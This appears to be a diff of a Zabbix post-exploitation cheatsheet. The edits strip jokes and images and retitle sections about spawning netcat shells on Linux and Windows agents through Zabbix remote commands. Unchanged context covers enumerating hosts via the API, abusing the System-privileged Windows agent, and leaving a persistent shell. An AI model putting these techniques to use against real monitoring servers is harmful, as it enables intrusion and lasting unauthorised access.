@@ -9,7 +9,7 @@ In Zabbix we got ability to run remote commands. This will work in the next stat
 It is also important to remember that the command length is limited to 255 characters.
 As a result, a successful scenario is the addition of a task to create a shell in Zabbix which will be accessible for 30 seconds(in the best scenario) and during his lifetime add an independent persistent shell.
 
-If you are too lazy to login to the web interface, you can use this script and get information about the agents that Zabbix monitors.
+You can use this script and get information about the monitored agents.
 ```python
 from pyzabbix import ZabbixAPI
 api_address=raw_input("enter correct URL to api_jsonrpc.php, like http://192.168.56.102/zabbix/api_jsonrpc.php"": \n")
@@ -27,10 +27,9 @@ for h in zapi.host.get(output="extend"):
 Result:
 <a href="url"><img src="https://image.prntscr.com/image/st11XKYfSneLiSUS5D_Wpg.png" align="justify"></a>
 
-## Meet the Unix!
-<a href="url"><img src="http://2.bp.blogspot.com/-8BLUZTtUu0M/T_TFQ3oTl4I/AAAAAAAAA4Q/bI19ps683ow/s1600/heavy_house_sm.jpg" align="justify" width="800"></a>
+## Shell on Linux agent
 
-And this homie will help us put the task to launch the shell using netcat:
+Script to spawn the netcat shell:
 
 ```python
 from pyzabbix import ZabbixAPI, ZabbixAPIException
@@ -72,12 +71,11 @@ How it's look:
 Connect to our shell:
 <a href="url"><img src="https://image.prntscr.com/image/jj3K7VPaQiydQDiKuZnW9w.png" align="justify"></a>
 
-Now you have to gain a foothold in the system and leave the persistent shell, are you already old enough to do it yourself?
+Now you have to gain a foothold in the system and leave the persistent shell.
 
-## Windows time!
-<a href="url"><img src="http://goldwallpapers.com/uploads/posts/pyro-wallpaper/pyro_wallpaper_012.jpg" align="justify" width="800"></a>
+## Shell on Windows agent
 
-By default, in Windows the agent is installed and started as a service with System privileges. For example, we use the same netcat, which will be downloaded from our server.
+By default, in Windows the agent is installed and started as a service with System privileges.
 ```python
 from pyzabbix import ZabbixAPI, ZabbixAPIException
 import sys
@@ -113,8 +111,6 @@ else:
     print("No hosts found")
 ```
 
-<a href="url"><img src="https://image.prntscr.com/image/NMG_MUJcTUOd3LasW2diuw.png" align="justify"></a>
-
 And then...
 <a href="url"><img src="https://image.prntscr.com/image/DOFyZ-ASQXGC6j7nfvSZUw.png" align="justify"></a>
 
@@ -146,7 +142,5 @@ After Zabbix service will cease to exist, we will have a permanent shell from th
 
 <a href="url"><img src="https://image.prntscr.com/image/jdY7_RTfS6G8UThnmEE-Ug.png" align="justify"></a>
 
-## Good job, folk! See ya soon
-
 P.S.
-Huge respect to [Shodin](https://github.com/freeworkaz) for his contribution to this cheatsheet. The latest versions of these scripts can be found [here](https://github.com/freeworkaz/zabbix_test). Also you can watch the [videos](https://www.youtube.com/channel/UC4wr-m-_6kRz2cHkdtRbW2g/videos) for a deeper understanding.
+Thanks to [Shodin](https://github.com/freeworkaz) for his contribution to this cheatsheet. The latest versions of these scripts can be found [here](https://github.com/freeworkaz/zabbix_test). Also you can watch the explanation [videos](https://www.youtube.com/channel/UC4wr-m-_6kRz2cHkdtRbW2g/videos) for a deeper understanding.
